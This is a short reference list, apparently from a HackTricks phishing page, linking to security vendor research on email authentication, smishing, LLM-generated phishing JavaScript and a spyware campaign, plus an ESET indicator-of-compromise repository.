- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
